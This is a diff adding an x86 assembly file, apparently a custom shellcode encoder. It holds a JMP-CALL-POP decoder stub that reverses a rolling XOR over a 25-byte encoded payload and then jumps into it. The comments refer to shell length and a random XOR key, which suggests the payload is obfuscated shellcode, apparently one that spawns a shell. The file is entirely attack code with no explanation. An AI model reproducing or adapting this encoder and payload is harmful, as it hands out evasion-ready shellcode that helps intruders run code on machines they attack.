@@ -1,0 +1,32 @@
+
+
+global _start
+
+section .text
+_start:
+
+
+	jmp short call_decoder
+
+decoder:
+
+	pop esi			
+	mov cl, 25 		; Insert counter for shell length
+	xor eax, eax	 
+	mov al, 0xe4	; Insert Random XOR Key
+	xor edx, edx
+
+decode:
+
+	mov dl, [esi]
+	xor al, dl
+	mov [esi], al
+	mov al, dl
+	inc esi
+	loop decode
+	jmp short shellcode
+
+call_decoder:
+
+	call decoder
+	shellcode: db 0xd5, 0x15, 0x45, 0x2d, 0x2, 0x2d, 0x5e, 0x36, 0x5e, 0x71, 0x13, 0x7a, 0x14, 0x9d, 0x7e, 0x2e, 0xa7, 0x45, 0x16, 0x9f, 0x7e, 0xce, 0xc5, 0x8, 0x88
